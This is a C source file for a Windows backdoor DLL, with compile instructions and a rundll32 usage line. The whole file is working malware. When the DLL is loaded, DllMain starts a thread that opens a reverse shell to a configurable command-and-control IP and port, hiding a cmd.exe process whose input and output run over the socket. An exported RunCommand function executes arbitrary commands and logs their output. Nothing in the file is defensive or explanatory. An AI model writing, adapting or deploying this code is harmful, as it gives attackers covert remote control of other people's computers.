// backdoor_dll.c
// Compile: x86_64-w64-mingw32-gcc -shared -o backdoor.dll backdoor_dll.c -lws2_32

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 4096
#define C2_IP "192.168.1.100"   // CHANGE THIS
#define C2_PORT 4444             // CHANGE THIS

// Function to execute a system command and return output as string
char* exec_cmd(const char* cmd) {
    static char result[BUFFER_SIZE];
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) return "Failed to execute command";
    result[0] = 0;
    while (fgets(result + strlen(result), sizeof(result) - strlen(result) - 1, pipe)) {}
    _pclose(pipe);
    return result;
}

// Reverse shell thread
DWORD WINAPI reverse_shell(LPVOID lpParam) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char recv_buf[BUFFER_SIZE];
    int bytes_recv;

    // Initialize Winsock
    WSAStartup(MAKEWORD(2,2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &server.sin_addr);

    // Connect to C2
    if (WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Create cmd process with redirected streams
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
    return 0;
}

// Command execution via named pipe or exported function
__declspec(dllexport) void RunCommand(const char* command) {
    char* output = exec_cmd(command);
    // Optional: send output via socket or write to file
    // For simplicity, write to a log file
    FILE* log = fopen("C:\\Windows\\Temp\\backdoor_log.txt", "a");
    if (log) {
        fprintf(log, "[CMD] %s\n[OUT] %s\n", command, output);
        fclose(log);
    }
}

// DLL entry point – automatically start reverse shell when loaded
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        CreateThread(NULL, 0, reverse_shell, NULL, 0, NULL);
    }
    return TRUE;
}

// Export a function to be called via rundll32.exe
// Usage: rundll32.exe backdoor.dll,Start
__declspec(dllexport) void Start(void) {
    reverse_shell(NULL);
}